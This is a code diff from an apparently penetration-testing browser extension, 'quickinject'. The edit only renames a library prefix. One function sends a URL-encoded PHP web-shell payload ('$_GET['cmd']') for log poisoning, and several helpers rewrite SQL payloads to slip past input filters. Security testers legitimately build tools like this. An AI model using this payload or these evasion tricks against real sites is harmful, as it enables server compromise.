@@ -138,7 +138,7 @@ end
 function quickinject:sendpoison_cmd(method)
  browser.options.showheaders = true
  tab:sendrequest{
-  url = slx.url.combine(reqbuilder.request.url,"/%3C%3Fphp+"..method.."%28%24_GET%5B%27cmd%27%5D%29+%3F%3E")
+  url = ctk.url.combine(reqbuilder.request.url,"/%3C%3Fphp+"..method.."%28%24_GET%5B%27cmd%27%5D%29+%3F%3E")
  }
  reqbuilder.edit.setfocus()
 end
@@ -149,19 +149,19 @@ function quickinject.getcustomrot(s)
 end
 
 function quickinject.addtosel(s)
- if slx.string.isint(s) == true then
+ if ctk.string.isint(s) == true then
   s = tonumber(s)+1
  else
-  s = slx.string.increase(s)
+  s = ctk.string.increase(s)
  end
  return s
 end
 
 function quickinject.subtosel(s)
- if slx.string.isint(s) == true then
+ if ctk.string.isint(s) == true then
   s = tonumber(s)-1
  else
-  s = slx.string.decrease(s)
+  s = ctk.string.decrease(s)
  end
  return s
 end
@@ -187,18 +187,18 @@ end
 
 -- php's stripslashes()
 function quickinject.stripslashes(s)
- s = slx.string.replace(s,[[\']],[[']])
- s = slx.string.replace(s,[[\"]],[["]])
- s = slx.string.replace(s,[[\\]],[[\]])
+ s = ctk.string.replace(s,[[\']],[[']])
+ s = ctk.string.replace(s,[[\"]],[["]])
+ s = ctk.string.replace(s,[[\\]],[[\]])
  return s
 end
 
 function quickinject.spacestocommenttags(s)
- return slx.string.replace(s," ", "/**/")
+ return ctk.string.replace(s," ", "/**/")
 end
 
 function quickinject.spacestonewlines(s)
- return slx.string.replace(s," ", "%0a")
+ return ctk.string.replace(s," ", "%0a")
 end
 
 function quickinject.strtohex_spaced(s)
@@ -210,7 +210,7 @@ function quickinject.strtohex_colonsep(s)
 end
 
 function quickinject.strtohex_0xhex(s)
- local hex = slx.convert.strtohex(s)
+ local hex = ctk.convert.strtohex(s)
  if hex ~='' then
   hex = '0x'..hex
  end
